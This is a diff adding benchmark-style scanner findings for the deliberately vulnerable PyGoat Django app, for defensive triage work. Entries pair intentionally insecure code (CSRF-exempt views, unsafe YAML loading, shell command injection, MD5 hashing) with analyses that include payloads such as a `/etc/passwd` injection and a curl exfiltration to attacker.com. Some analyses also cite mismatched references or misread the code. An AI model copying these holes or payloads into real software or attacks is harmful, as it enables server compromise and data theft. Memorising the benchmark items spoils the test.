@@ -1,0 +1,1498 @@
+[
+ {
+  "id": "pygoat-0089",
+  "benchmark": "pygoat",
+  "source_root": "<BENCHMARK_CHECKOUTS>/pygoat",
+  "file": "introduction/views.py",
+  "line": 550,
+  "end_line": 569,
+  "rule_id": "no-csrf-exempt",
+  "cwe": [
+   "CWE-352: Cross-Site Request Forgery (CSRF)"
+  ],
+  "scanner_message": "Detected usage of @csrf_exempt, which indicates that there is no CSRF token set for this route. This could lead to an attacker manipulating the user's account and exfiltration of private data. Instead, create a function without this decorator.",
+  "snippet": "    else:\n        return redirect('login')\n@csrf_exempt\ndef a9_lab(request):\n    if request.user.is_authenticated:\n        if request.method==\"GET\":\n            return render(request,\"Lab/A9/a9_lab.html\")\n        else:\n\n            try :\n                file=request.FILES[\"file\"]\n                try :\n                    data = yaml.load(file,yaml.Loader)\n                    \n                    return render(request,\"Lab/A9/a9_lab.html\",{\"data\":data})\n                except:\n                    return render(request, \"Lab/A9/a9_lab.html\", {\"data\": \"Error\"})\n\n            except:\n                return render(request, \"Lab/A9/a9_lab.html\", {\"data\":\"Please Upload a Yaml file.\"})\n    else:\n        return redirect('login')\ndef get_version(request):\n      return render(request,\"Lab/A9/a9_lab.html\",{\"version\":\"pyyaml v5.1\"})",
+  "detector_analysis": "Confirmed: yes  \nSeverity: high  \n\n## Impact  \nThe `a9_lab` view in `introduction/views.py` disables CSRF protection via `@csrf_exempt`, allowing unauthenticated attackers to submit arbitrary YAML files via POST requests. Because the view uses `yaml.load(file, yaml.Loader)` — which permits arbitrary Python object instantiation — this exposes the application to remote code execution (RCE) via malicious YAML payloads (e.g., `!!python/object/new:os.system`). An attacker could craft a CSRF-triggering POST to `/a9_lab/` from a malicious site, tricking an authenticated admin into uploading a malicious YAML file, thereby achieving RCE on the server.\n\n## Attack Scenario  \n1. Attacker hosts a malicious HTML page (e.g., `exploit.html`) containing a hidden `<form>` targeting `https://victimsite.com/a9_lab/` with method `POST` and a crafted YAML file payload (e.g., one using `!!python/object/new:subprocess.Popen` or `!!python/object/new:os.system` with a reverse shell command).  \n2. Authenticated victim (e.g., admin) visits the attacker’s page while logged into the Django app.  \n3. The form auto-submits (via JavaScript or user interaction), sending a POST request to `/a9_lab/` with the malicious YAML file.  \n4. Because `@csrf_exempt` is present, Django does not validate a CSRF token, and the request proceeds.  \n5. `yaml.load(file, yaml.Loader)` deserializes the YAML, instantiating arbitrary Python objects and executing the embedded command (CWE-352 + CWE-502).  \n6. Attacker gains RCE on the Django server — full system compromise, data exfiltration, or persistence.\n\n## Recommendation  \n**Primary fix**: Remove `@csrf_exempt` and replace the YAML deserialization with a safe parser (e.g., `yaml.safe_load(file)`), which prevents arbitrary object instantiation (CWE-502).  \n**Defense in depth**: Enforce CSRF tokens via Django’s `{% csrf_token %}` in templates and `@csrf_protect` decorator; add `CSRF_TRUSTED_ORIGINS` and `CSRF_COOKIE_SECURE=True` in production.  \n**References**: CWE-352, CWE-502, OWASP A01:2021 (Broken Access Control), OWASP A03:2021 (Injection), SWC-117 (Deserialization of Untrusted Data)",
+  "documented_entries_for_this_file": [
+   {
+    "id": "SQL Injection",
+    "file": "introduction/views.py",
+    "category": "sql_injection"
+   },
+   {
+    "id": "Command Injection (subprocess shell=True)",
+    "file": "introduction/views.py",
+    "category": "command_injection"
+   },
+   {
+    "id": "Command Injection (eval)",
+    "file": "introduction/views.py",
+    "category": "command_injection"
+   },
+   {
+    "id": "Insecure Deserialization (pickle)",
+    "file": "introduction/views.py",
+    "category": "insecure_deserialization"
+   },
+   {
+    "id": "XXE Injection",
+    "file": "introduction/views.py",
+    "category": "xxe"
+   },
+   {
+    "id": "XSS Reflected (Lab1)",
+    "file": "introduction/views.py",
+    "category": "xss"
+   },
+   {
+    "id": "Broken Access Control (cookie)",
+    "file": "introduction/views.py",
+    "category": "broken_access_control"
+   },
+   {
+    "id": "YAML Deserialization (A9)",
+    "file": "introduction/views.py",
+    "category": "insecure_deserialization"
+   },
+   {
+    "id": "SSRF",
+    "file": "introduction/views.py",
+    "category": "ssrf"
+   }
+  ]
+ },
+ {
+  "id": "pygoat-0060",
+  "benchmark": "pygoat",
+  "source_root": "<BENCHMARK_CHECKOUTS>/pygoat",
+  "file": "introduction/apis.py",
+  "line": 59,
+  "end_line": 90,
+  "rule_id": "no-csrf-exempt",
+  "cwe": [
+   "CWE-352: Cross-Site Request Forgery (CSRF)"
+  ],
+  "scanner_message": "Detected usage of @csrf_exempt, which indicates that there is no CSRF token set for this route. This could lead to an attacker manipulating the user's account and exfiltration of private data. Instead, create a function without this decorator.",
+  "snippet": "\n\n@csrf_exempt\n# @authentication_decorator\ndef log_function_checker(request):\n    if request.method == 'POST':\n        csrf_token = request.POST.get(\"csrfmiddlewaretoken\")\n        log_code = request.POST.get('log_code')\n        api_code = request.POST.get('api_code')\n        dirname = os.path.dirname(__file__)\n        log_filename = os.path.join(dirname, \"playground/A9/main.py\")\n        api_filename = os.path.join(dirname, \"playground/A9/api.py\")\n        f = open(log_filename,\"w\")\n        f.write(log_code)\n        f.close()\n        f = open(api_filename,\"w\")\n        f.write(api_code)\n        f.close()\n        # Clearing the log file before starting the test\n        f = open('test.log', 'w')\n        f.write(\"\")\n        f.close()\n        url = \"http://127.0.0.1:8000/2021/discussion/A9/target\"\n        payload={'csrfmiddlewaretoken': csrf_token }\n        requests.request(\"GET\", url)\n        requests.request(\"POST\", url)\n        requests.request(\"PATCH\", url, data=payload)\n        requests.request(\"DELETE\", url)\n        f = open('test.log', 'r')\n        lines = f.readlines()\n        f.close()\n        return JsonResponse({\"message\":\"success\", \"logs\": lines},status = 200)\n    else:\n        return JsonResponse({\"message\":\"method not allowed\"},status = 405)\n\n#a7 codechecking api",
+  "detector_analysis": "Confirmed: yes  \nSeverity: high  \n\n## Impact  \nThe `log_function_checker` view in `introduction/apis.py` is decorated with `@csrf_exempt`, disabling Django’s CSRF protection. Combined with its behavior—accepting arbitrary `log_code` and `api_code` via POST and writing them directly to `playground/A9/main.py` and `playground/A9/api.py`—this enables an attacker to perform a CSRF attack that injects arbitrary Python code into the application’s runtime environment. An authenticated victim (e.g., an admin) visiting a malicious page could be tricked into submitting a POST request that overwrites `main.py` with malicious code (e.g., a backdoor or data exfiltration script), leading to remote code execution (RCE) and full compromise of the application’s integrity and confidentiality.\n\n## Attack Scenario  \n1. Attacker crafts an HTML page with a hidden `<form>` targeting `http://127.0.0.1:8000/log_function_checker` (or the production-equivalent URL), pre-filled with malicious `log_code` (e.g., a Python reverse shell) and `api_code`.  \n2. The form includes the victim’s session cookie (via browser auto-attachment) and submits automatically on page load (e.g., via `onload=\"document.getElementById('exploit').submit()\"`).  \n3. When an authenticated user (e.g., admin) visits the attacker’s page, the browser sends the POST request with valid session credentials but *without* a CSRF token (because `@csrf_exempt` disables validation).  \n4. The `log_function_checker` function writes the attacker-provided `log_code` to `playground/A9/main.py` (line 12–14) and `api_code` to `playground/A9/api.py` (line 15–17).  \n5. If the injected code is executed later (e.g., via a subsequent request that imports or runs `main.py`, or if the app auto-reloads), the attacker’s payload runs with the app’s privileges — achieving RCE and potential data exfiltration or persistence.  \n\n## Recommendation  \n**Primary fix**: Remove `@csrf_exempt` and ensure CSRF tokens are enforced. In Django, this means either:  \n- Omitting `@csrf_exempt` (default CSRF protection applies), and including the `{% csrf_token %}` in any form or sending `X-CSRFToken` header from JavaScript.  \n- If the endpoint *must* be stateless (e.g., API-only), use `@csrf_exempt` only *after* implementing an alternative token-based mechanism (e.g., JWT or API key) and restrict to authenticated, non-browser clients.  \n\n**Defense in depth**:  \n- Sanitize and validate `log_code`/`api_code` before writing to disk — avoid writing arbitrary user input to executable files.  \n- Use a secure file upload or code-execution sandbox (e.g., restricted subprocess with `timeout`, `chroot`, or containerization).  \n- Log and alert on writes to `playground/A9/` to detect tampering.  \n\n**References**: OWASP A01:2021 – Broken Access Control (CWE-352), Django CSRF documentation, SWC-112 (CSRF)",
+  "documented_entries_for_this_file": []
+ },
+ {
+  "id": "pygoat-0065",
+  "benchmark": "pygoat",
+  "source_root": "<BENCHMARK_CHECKOUTS>/pygoat",
+  "file": "introduction/playground/A9/api.py",
+  "line": 7,
+  "end_line": 33,
+  "rule_id": "no-csrf-exempt",
+  "cwe": [
+   "CWE-352: Cross-Site Request Forgery (CSRF)"
+  ],
+  "scanner_message": "Detected usage of @csrf_exempt, which indicates that there is no CSRF token set for this route. This could lead to an attacker manipulating the user's account and exfiltration of private data. Instead, create a function without this decorator.",
+  "snippet": "\n\n@csrf_exempt\ndef log_function_target(request):\n    L = Log(request)\n    if request.method == \"GET\":\n        L.info(\"GET request\")\n        return JsonResponse({\"message\":\"normal get request\", \"method\":\"get\"},status = 200)\n    if request.method == \"POST\":\n        username = request.POST['username']\n        password = request.POST['password']\n        L.info(f\"POST request with username {username} and password {password}\")\n        if username == \"admin\" and password == \"admin\":\n            return JsonResponse({\"message\":\"Loged in successfully\", \"method\":\"post\"},status = 200)\n        return JsonResponse({\"message\":\"Invalid credentials\", \"method\":\"post\"},status = 401)\n    if request.method == \"PUT\":\n        L.info(\"PUT request\")\n        return JsonResponse({\"message\":\"success\", \"method\":\"put\"},status = 200)\n    if request.method == \"DELETE\":\n        if request.user.is_authenticated:\n            return JsonResponse({\"message\":\"User is authenticated\", \"method\":\"delete\"},status = 200)\n        L.error(\"DELETE request\")\n        return JsonResponse({\"message\":\"permission denied\", \"method\":\"delete\"},status = 200)\n    if request.method == \"PATCH\":\n        L.info(\"PATCH request\")\n        return JsonResponse({\"message\":\"success\", \"method\":\"patch\"},status = 200)\n    if request.method == \"UPDATE\":\n        return JsonResponse({\"message\":\"success\", \"method\":\"update\"},status = 200)\n    return JsonResponse({\"message\":\"method not allowed\"},status = 403)",
+  "detector_analysis": "Confirmed: yes\nSeverity: high\n\n## Impact\nAn attacker can forge arbitrary POST requests to the `log_function_target` endpoint to brute-force admin credentials, log sensitive credentials in plaintext, and potentially trigger account lockouts or credential stuffing attacks — all without CSRF protection. The endpoint accepts username and password via `request.POST`, logs them verbatim, and returns authentication status, exposing credentials in logs and enabling account takeover via cross-origin requests.\n\n## Attack Scenario\n1. Attacker crafts a malicious HTML page with a hidden `<form>` targeting `http://victim.com/log_function_target/`.\n2. The form includes hidden fields `username` and `password`, pre-filled with attacker-chosen values (e.g., `admin` / `password123`).\n3. Attacker tricks a logged-in admin user (with valid session cookies) into visiting the malicious page — e.g., via phishing or XSS.\n4. The browser automatically sends the user’s session cookies with the POST request, bypassing any session-based rate limiting.\n5. Django processes the request because `@csrf_exempt` disables CSRF token validation (line 1 in `api.py`).\n6. The `log_function_target` function logs the submitted credentials (line 11), and returns whether login succeeded (lines 12–14).\n7. Attacker observes the response (e.g., via CORS, image beacon, or log exfiltration) to confirm valid credentials, enabling full account compromise.\n\n## Recommendation\nPrimary fix: Remove `@csrf_exempt` and ensure the endpoint is protected by Django’s CSRF middleware (default for POST/PUT/PATCH/DELETE). Add `{% csrf_token %}` to forms or send `X-CSRFToken` header from frontend.\nDefense in depth: Implement rate limiting on login attempts, sanitize or redact credentials before logging, and use Django’s `@login_required` decorator for authenticated-only endpoints.\nReferences: CWE-352, OWASP A5:2021, SWC-108",
+  "documented_entries_for_this_file": []
+ },
+ {
+  "id": "pygoat-0093",
+  "benchmark": "pygoat",
+  "source_root": "<BENCHMARK_CHECKOUTS>/pygoat",
+  "file": "introduction/views.py",
+  "line": 414,
+  "end_line": 450,
+  "rule_id": "no-csrf-exempt",
+  "cwe": [
+   "CWE-352: Cross-Site Request Forgery (CSRF)"
+  ],
+  "scanner_message": "Detected usage of @csrf_exempt, which indicates that there is no CSRF token set for this route. This could lead to an attacker manipulating the user's account and exfiltration of private data. Instead, create a function without this decorator.",
+  "snippet": "    else:\n        return redirect('login')\n@csrf_exempt\ndef cmd_lab(request):\n    if request.user.is_authenticated:\n        if(request.method==\"POST\"):\n            domain=request.POST.get('domain')\n            # Remove all common protocols (case-insensitive) and www prefix\n            domain = re.sub(r'^(?:(https?|ftp)://)?(?:www\\.)?', '', domain, flags=re.IGNORECASE)\n            os=request.POST.get('os')\n            print(os)\n            if(os=='win'):\n                command=\"nslookup {}\".format(domain)\n            else:\n                command = \"dig {}\".format(domain)\n            \n            try:\n                # output=subprocess.check_output(command,shell=True,encoding=\"UTF-8\")\n                process = subprocess.Popen(\n                    command,\n                    shell=True,\n                    stdout=subprocess.PIPE, \n                    stderr=subprocess.PIPE)\n                stdout, stderr = process.communicate()\n                data = stdout.decode('utf-8')\n                stderr = stderr.decode('utf-8')\n                # res = json.loads(data)\n                # print(\"Stdout\\n\" + data)\n                output = data + stderr\n                print(data + stderr)\n            except:\n                output = \"Something went wrong\"\n                return render(request,'Lab/CMD/cmd_lab.html',{\"output\":output})\n            print(output)\n            return render(request,'Lab/CMD/cmd_lab.html',{\"output\":output})\n        else:\n            return render(request, 'Lab/CMD/cmd_lab.html')\n    else:\n        return redirect('login')\n\n@csrf_exempt",
+  "detector_analysis": "Confirmed: yes  \nSeverity: high  \n\n## Impact  \nThe `cmd_lab` view in `introduction/views.py` disables CSRF protection via `@csrf_exempt`, while accepting unsanitized user input (`domain`, `os`) and executing OS commands via `subprocess.Popen(..., shell=True)`. This combination enables an attacker to forge authenticated requests (CSRF) and inject arbitrary shell commands (command injection), leading to full server compromise — including reading/writing files, exfiltrating credentials, or pivoting into internal infrastructure. The invariant violated is: *authenticated user actions must be protected against both CSRF and command injection*.\n\n## Attack Scenario  \n1. Attacker crafts a malicious HTML page with a hidden `<form>` targeting `POST /cmd_lab/`, pre-filling `domain` with a command injection payload (e.g., `example.com; cat /etc/passwd > /tmp/pwned`) and `os=linux`.  \n2. An authenticated victim (e.g., admin) visits the attacker’s page while logged into the vulnerable Django app.  \n3. The browser automatically includes the session cookie (CSRF bypass via `@csrf_exempt`), and the form submits to `/cmd_lab/`.  \n4. Django’s `cmd_lab` view (line 12–13) extracts `domain` and `os` from `request.POST`, then constructs a shell command (lines 18–21).  \n5. `subprocess.Popen(..., shell=True)` executes the malicious command (line 23), leaking `/etc/passwd` to `/tmp/pwned` or executing arbitrary code.  \n6. Attacker retrieves the exfiltrated data via file-read or reverse-shell access.  \n\n## Recommendation  \nPrimary fix:  \n- Remove `@csrf_exempt` and ensure CSRF tokens are enforced (Django’s default `CsrfViewMiddleware` handles this if the decorator is absent and the view is POST).  \n- Replace `shell=True` with a list-based command invocation and validate `domain` against a strict allowlist (e.g., `^[a-zA-Z0-9.-]+$`) and `os` to a fixed enum (`['win', 'linux']`).  \n- Use `subprocess.run([...], capture_output=True, text=True)` instead of `shell=True`.  \n\nDefense in depth:  \n- Add `@login_required` decorator explicitly (already present via manual check, but Django’s decorator is safer).  \n- Implement rate-limiting and logging for `/cmd_lab/`.  \n- Deploy CSP with `form-action 'self'` and `sandbox` directives to mitigate CSRF impact.  \n\nReferences: OWASP A01:2021, CWE-352, CWE-78, Django CSRF docs, SWC-132, SWC-114",
+  "documented_entries_for_this_file": [
+   {
+    "id": "SQL Injection",
+    "file": "introduction/views.py",
+    "category": "sql_injection"
+   },
+   {
+    "id": "Command Injection (subprocess shell=True)",
+    "file": "introduction/views.py",
+    "category": "command_injection"
+   },
+   {
+    "id": "Command Injection (eval)",
+    "file": "introduction/views.py",
+    "category": "command_injection"
+   },
+   {
+    "id": "Insecure Deserialization (pickle)",
+    "file": "introduction/views.py",
+    "category": "insecure_deserialization"
+   },
+   {
+    "id": "XXE Injection",
+    "file": "introduction/views.py",
+    "category": "xxe"
+   },
+   {
+    "id": "XSS Reflected (Lab1)",
+    "file": "introduction/views.py",
+    "category": "xss"
+   },
+   {
+    "id": "Broken Access Control (cookie)",
+    "file": "introduction/views.py",
+    "category": "broken_access_control"
+   },
+   {
+    "id": "YAML Deserialization (A9)",
+    "file": "introduction/views.py",
+    "category": "insecure_deserialization"
+   },
+   {
+    "id": "SSRF",
+    "file": "introduction/views.py",
+    "category": "ssrf"
+   }
+  ]
+ },
+ {
+  "id": "pygoat-0110",
+  "benchmark": "pygoat",
+  "source_root": "<BENCHMARK_CHECKOUTS>/pygoat",
+  "file": "introduction/views.py",
+  "line": 1177,
+  "end_line": 1205,
+  "rule_id": "no-csrf-exempt",
+  "cwe": [
+   "CWE-352: Cross-Site Request Forgery (CSRF)"
+  ],
+  "scanner_message": "Detected usage of @csrf_exempt, which indicates that there is no CSRF token set for this route. This could lead to an attacker manipulating the user's account and exfiltration of private data. Instead, create a function without this decorator.",
+  "snippet": "# }\n\n@authentication_decorator\n@csrf_exempt\ndef auth_failure_lab3(request):\n    if request.method == \"GET\":\n        try:\n            cookie = request.COOKIES[\"session_id\"]\n            session = AF_session_id.objects.get(session_id=cookie)\n            if session :\n                return render(request,\"Lab_2021/A7_auth_failure/lab3.html\", {\"username\":session.user,\"success\":True})\n        except:\n            pass\n        return render(request, \"Lab_2021/A7_auth_failure/lab3.html\")\n    elif request.method == \"POST\":\n        token = str(uuid.uuid4())\n        try:\n            username = request.POST[\"username\"]\n            password = request.POST[\"password\"]\n            password = hashlib.sha256(password.encode()).hexdigest()\n        except:\n            response = render(request, \"Lab_2021/A7_auth_failure/lab3.html\")\n            response.set_cookie(\"session_id\", None)\n            return response\n\n        if USER_A7_LAB3[username]['password'] == password:\n            session_data = AF_session_id.objects.create(session_id=token, user=USER_A7_LAB3[username]['username'])\n            session_data.save()\n            response = render(request, \"Lab_2021/A7_auth_failure/lab3.html\", {\"success\":True, \"failure\":False, \"username\":username})\n            response.set_cookie(\"session_id\", token)\n            return response\n\n#-- coding playground for lab2",
+  "detector_analysis": "Confirmed: yes  \nSeverity: high  \n\n## Impact  \nThe `@csrf_exempt` decorator on `auth_failure_lab3` disables Django’s CSRF protection for a POST endpoint that performs authentication and session creation. An attacker can craft a malicious page that, when visited by an authenticated victim, submits a forged POST request to `/auth_failure_lab3` with arbitrary credentials, potentially hijacking the victim’s session or forcing login under attacker-controlled credentials. This violates the integrity of user sessions and enables account takeover via social engineering or automated phishing.\n\n## Attack Scenario  \n1. Attacker hosts a malicious page (e.g., `evil.com`) containing a hidden `<form>` targeting `POST /auth_failure_lab3` with `username=attacker&password=attacker_password`.  \n2. Victim (logged into the vulnerable app in another tab) visits `evil.com`.  \n3. JavaScript on `evil.com` auto-submits the form (or uses `fetch`/`XMLHttpRequest` if CORS permits), sending the forged request with victim’s browser cookies (including `session_id`).  \n4. Because `@csrf_exempt` disables CSRF token validation, Django processes the request as legitimate.  \n5. If the attacker-chosen credentials match a real user (e.g., via credential stuffing or guessing), a new session is created and set as a cookie, effectively hijacking that user’s session.  \n6. Attacker now controls the victim’s account via the newly issued `session_id` cookie.  \n\n## Recommendation  \nPrimary fix: Remove `@csrf_exempt` and add CSRF protection using Django’s `{% csrf_token %}` in forms and `@csrf_protect` decorator where needed. For API endpoints, use `CsrfViewMiddleware` with proper token exchange (e.g., via `X-CSRFToken` header).  \nDefense in depth: Enforce SameSite=Lax/Strict cookies for `session_id`, and validate CSRF tokens on all state-changing endpoints.  \nReferences: CWE-352, OWASP A01:2021, SWC-118",
+  "documented_entries_for_this_file": [
+   {
+    "id": "SQL Injection",
+    "file": "introduction/views.py",
+    "category": "sql_injection"
+   },
+   {
+    "id": "Command Injection (subprocess shell=True)",
+    "file": "introduction/views.py",
+    "category": "command_injection"
+   },
+   {
+    "id": "Command Injection (eval)",
+    "file": "introduction/views.py",
+    "category": "command_injection"
+   },
+   {
+    "id": "Insecure Deserialization (pickle)",
+    "file": "introduction/views.py",
+    "category": "insecure_deserialization"
+   },
+   {
+    "id": "XXE Injection",
+    "file": "introduction/views.py",
+    "category": "xxe"
+   },
+   {
+    "id": "XSS Reflected (Lab1)",
+    "file": "introduction/views.py",
+    "category": "xss"
+   },
+   {
+    "id": "Broken Access Control (cookie)",
+    "file": "introduction/views.py",
+    "category": "broken_access_control"
+   },
+   {
+    "id": "YAML Deserialization (A9)",
+    "file": "introduction/views.py",
+    "category": "insecure_deserialization"
+   },
+   {
+    "id": "SSRF",
+    "file": "introduction/views.py",
+    "category": "ssrf"
+   }
+  ]
+ },
+ {
+  "id": "pygoat-0064",
+  "benchmark": "pygoat",
+  "source_root": "<BENCHMARK_CHECKOUTS>/pygoat",
+  "file": "introduction/apis.py",
+  "line": 130,
+  "end_line": 134,
+  "rule_id": "request-data-write",
+  "cwe": [
+   "CWE-93: Improper Neutralization of CRLF Sequences ('CRLF Injection')"
+  ],
+  "scanner_message": "Found user-controlled request data passed into '.write(...)'. This could be dangerous if a malicious actor is able to control data into sensitive files. For example, a malicious actor could force rolling of critical log files, or cause a denial-of-service by using up available disk space. Instead, ensure that request data is properly escaped or sanitized.",
+  "snippet": "        return JsonResponse({\"message\":\"method not allowed\"},status = 405)\n    try:\n        code = request.POST.get('code')\n        dirname = os.path.dirname(__file__)\n        filename = os.path.join(dirname, \"playground/A6/utility.py\")\n        f = open(filename,\"w\")\n        f.write(code)\n        f.close()\n    except:",
+  "detector_analysis": "Confirmed: yes\nSeverity: high\n\n## Impact\nAn attacker can write arbitrary Python code to `playground/A6/utility.py` via the `A6_disscussion_api_2` view by supplying malicious input in the `code` POST parameter. This compromises the integrity of the application by enabling remote code execution (RCE) on the server — for example, an attacker could overwrite `utility.py` with a backdoor that exfiltrates secrets, executes OS commands, or modifies database records. The invariant at risk is *server-side code integrity* — the application assumes user-controlled input is safe to persist as executable code.\n\n## Attack Scenario\n1. Attacker sends a POST request to `/apis/A6_disscussion_api_2/` (line 1 in `introduction/apis.py`).\n2. The view accepts `code = request.POST.get('code')` (line 6), directly reading unsanitized user input.\n3. The attacker supplies malicious Python code as the `code` value — e.g., `import os; os.system('curl http://attacker.com/$(cat /etc/passwd | base64)')`.\n4. The code is written verbatim to `playground/A6/utility.py` via `f.write(code)` (line 9).\n5. If `utility.py` is imported or executed elsewhere in the application (e.g., via `from playground.A6.utility import *` or `exec(open(...).read())`), the attacker’s payload runs with the app’s privileges — achieving full RCE.\n\n## Recommendation\nPrimary fix: Never write user-controlled data directly to executable files. Replace the write operation with a safe, sandboxed execution mechanism (e.g., a restricted subprocess environment) or store code in a database and validate/escape it before rendering. If the intent is to support user-submitted snippets, use a secure interpreter like `RestrictedPython` or a containerized execution service.\n\nDefense in depth: \n- Validate and sanitize input using Django’s `escape` or a dedicated code-sanitization library (e.g., `bleach` for HTML, but for Python use AST parsing or whitelisting).\n- Enforce strict file permissions and use `os.path.realpath()` + path whitelisting to prevent directory traversal.\n- Add CSRF protection and role-based access control — restrict `A6_disscussion_api_2` to trusted users only.\n\nReferences: CWE-94 (Improper Control of Generation of Code), CWE-93, OWASP A1:2021 – Broken Access Control, SWC-115 (Server-Side Request Forgery), SWC-117 (Improper Resource Shutdown or Release)",
+  "documented_entries_for_this_file": []
+ },
+ {
+  "id": "pygoat-0092",
+  "benchmark": "pygoat",
+  "source_root": "<BENCHMARK_CHECKOUTS>/pygoat",
+  "file": "introduction/views.py",
+  "line": 492,
+  "end_line": 518,
+  "rule_id": "no-csrf-exempt",
+  "cwe": [
+   "CWE-352: Cross-Site Request Forgery (CSRF)"
+  ],
+  "scanner_message": "Detected usage of @csrf_exempt, which indicates that there is no CSRF token set for this route. This could lead to an attacker manipulating the user's account and exfiltration of private data. Instead, create a function without this decorator.",
+  "snippet": "    return render(request,\"Lab/BrokenAuth/otp.html\")\n\n@csrf_exempt\ndef Otp(request):\n    if request.method==\"GET\":\n        email=request.GET.get('email')\n        otpN=randint(100,999)\n        if email and otpN:\n            if email==\"admin@pygoat.com\":\n                otp.objects.filter(id=2).update(otp=otpN)\n                html = render(request, \"Lab/BrokenAuth/otp.html\", {\"otp\":\"Sent To Admin Mail ID\"})\n                html.set_cookie(\"email\", email)\n                return html\n\n            else:\n                otp.objects.filter(id=1).update(email=email, otp=otpN)\n                html=render (request,\"Lab/BrokenAuth/otp.html\",{\"otp\":otpN})\n                html.set_cookie(\"email\",email)\n                return html\n        else:\n            return render(request,\"Lab/BrokenAuth/otp.html\")\n    else:\n        otpR=request.POST.get(\"otp\")\n        email=request.COOKIES.get(\"email\")\n        if otp.objects.filter(email=email,otp=otpR) or otp.objects.filter(id=2,otp=otpR):\n            # return HttpResponse(\"<h3>Login Success for email:::\"+email+\"</h3>\")\n            return render (request,\"Lab/BrokenAuth/otp.html\",{\"email\":email})\n        else:\n            return render (request,\"Lab/BrokenAuth/otp.html\",{\"otp\":\"Invalid OTP Please Try Again\"})",
+  "detector_analysis": "Confirmed: yes  \nSeverity: high  \n\n## Impact  \nAn attacker can forge authenticated requests to the `Otp` view, bypassing Django’s CSRF protection. Because the view is decorated with `@csrf_exempt`, an attacker can trick an authenticated or logged-in user (e.g., via a malicious link or embedded image in an email) into triggering OTP generation or validation without their knowledge — enabling account takeover via forced OTP generation (e.g., sending OTP to attacker-controlled email) or session fixation via cookie manipulation (`set_cookie(\"email\", email)`). The invariant at risk is **user session integrity and authentication state isolation**.\n\n## Attack Scenario  \n1. Attacker crafts a malicious page with an auto-submitting form POSTing to `/Otp` (line 12–42 in `introduction/views.py`), e.g., `email=attacker@example.com`.  \n2. Victim (e.g., admin or target user) visits attacker’s page while logged into the vulnerable app (or even just with a valid session cookie in scope).  \n3. The POST triggers `Otp(request)` (line 12), which:  \n   - Reads `email` from `request.POST` (line 22 or 28),  \n   - Generates a new OTP (`otpN=randint(100,999)`),  \n   - Stores it in the database (`otp.objects.filter(...).update(...)`),  \n   - Sets the victim’s browser cookie to `email=attacker@example.com` (line 25 or 31).  \n4. Attacker now knows the OTP (if sent to victim’s browser) or can trigger OTP generation for the victim’s account (e.g., admin@pygoat.com), then use it to log in via the same view’s POST path (lines 33–40).  \n5. If the attacker controls the email field and the OTP is visible in the rendered HTML (line 31: `{\"otp\":otpN}`), they can extract it and complete login.  \n\nPost-condition: Attacker gains unauthorized access to victim’s account or forces OTP generation for privileged accounts.\n\n## Recommendation  \n**Primary fix**: Remove `@csrf_exempt` and ensure the `Otp` view is protected by Django’s CSRF middleware (i.e., use `{% csrf_token %}` in forms and require POST with valid token).  \n**Defense in depth**:  \n- Validate that `email` matches the authenticated user’s email (if user is logged in), or require explicit user confirmation before sending OTP.  \n- Use `request.user` instead of cookie-based email lookup to prevent cookie tampering.  \n- Consider rate-limiting OTP generation per email/IP to mitigate forced OTP generation.  \n**References**: CWE-352, OWASP A01:2021 – Broken Access Control, SWC-108",
+  "documented_entries_for_this_file": [
+   {
+    "id": "SQL Injection",
+    "file": "introduction/views.py",
+    "category": "sql_injection"
+   },
+   {
+    "id": "Command Injection (subprocess shell=True)",
+    "file": "introduction/views.py",
+    "category": "command_injection"
+   },
+   {
+    "id": "Command Injection (eval)",
+    "file": "introduction/views.py",
+    "category": "command_injection"
+   },
+   {
+    "id": "Insecure Deserialization (pickle)",
+    "file": "introduction/views.py",
+    "category": "insecure_deserialization"
+   },
+   {
+    "id": "XXE Injection",
+    "file": "introduction/views.py",
+    "category": "xxe"
+   },
+   {
+    "id": "XSS Reflected (Lab1)",
+    "file": "introduction/views.py",
+    "category": "xss"
+   },
+   {
+    "id": "Broken Access Control (cookie)",
+    "file": "introduction/views.py",
+    "category": "broken_access_control"
+   },
+   {
+    "id": "YAML Deserialization (A9)",
+    "file": "introduction/views.py",
+    "category": "insecure_deserialization"
+   },
+   {
+    "id": "SSRF",
+    "file": "introduction/views.py",
+    "category": "ssrf"
+   }
+  ]
+ },
+ {
+  "id": "pygoat-0108",
+  "benchmark": "pygoat",
+  "source_root": "<BENCHMARK_CHECKOUTS>/pygoat",
+  "file": "introduction/views.py",
+  "line": 1027,
+  "end_line": 1027,
+  "rule_id": "md5-used-as-password",
+  "cwe": [
+   "CWE-327: Use of a Broken or Risky Cryptographic Algorithm"
+  ],
+  "scanner_message": "It looks like MD5 is used as a password hash. MD5 is not considered a secure password hash because it can be cracked by an attacker in a short amount of time. Use a suitable password hashing function such as scrypt. You can use `hashlib.scrypt`.",
+  "snippet": "            try:\n                password = md5(password.encode()).hexdigest()\n                user = CF_user.objects.filter(username=username,password=password).first()\n                return render(request,\"Lab_2021/A2_Crypto_failur/crypto_failure_lab.html\",{\"user\":user, \"success\":True,\"failure\":False})\n            except Exception as e:",
+  "detector_analysis": "Confirmed: yes\nSeverity: high\n\n## Impact\nThe `crypto_failure_lab` view in `introduction/views.py` hashes user-supplied passwords using MD5 before querying the database (`CF_user.objects.filter(...)`). MD5 is cryptographically broken for password storage: it is fast, unsalted, and vulnerable to rainbow-table and brute-force attacks. An attacker who gains access to the database (e.g., via SQL injection in `sql_lab`, misconfiguration, or insider threat) can trivially recover plaintext passwords for a large fraction of users, compromising confidentiality and enabling credential-stuffing across other services. This violates the integrity of user authentication and exposes funds or data protected by reused credentials.\n\n## Attack Scenario\n1. Attacker identifies the vulnerable login endpoint at `POST /crypto_failure_lab` (line 12–23 in `introduction/views.py`).\n2. Attacker obtains the `CF_user` table contents (e.g., via SQL injection in `sql_lab`, or database dump).\n3. For each stored MD5 hash in the `password` column, attacker uses a precomputed rainbow table or GPU-accelerated brute-force (e.g., hashcat) to recover the original password in seconds to minutes.\n4. Attacker logs in as any cracked user, gaining unauthorized access to accounts and potentially escalating privileges if password reuse is common.\n\n## Recommendation\nPrimary fix: Replace MD5 with a modern, adaptive password-hashing function such as `hashlib.scrypt`, `argon2`, or `pbkdf2_hmac` with a per-user salt and sufficient work factor (e.g., `iterations ≥ 210,000` for PBKDF2-SHA256). Update the `crypto_failure_lab` function to hash using the new algorithm and store the salt alongside the hash.\n\nDefense in depth: Enforce unique, high-entropy salts per user; migrate existing MD5 hashes to the new scheme on next login (lazy migration); audit all other views (`crypto_failure_lab2`, `crypto_failure_lab3`) for similar misuse.\n\nReferences: CWE-327, OWASP A02:2021, NIST SP 800-132",
+  "documented_entries_for_this_file": [
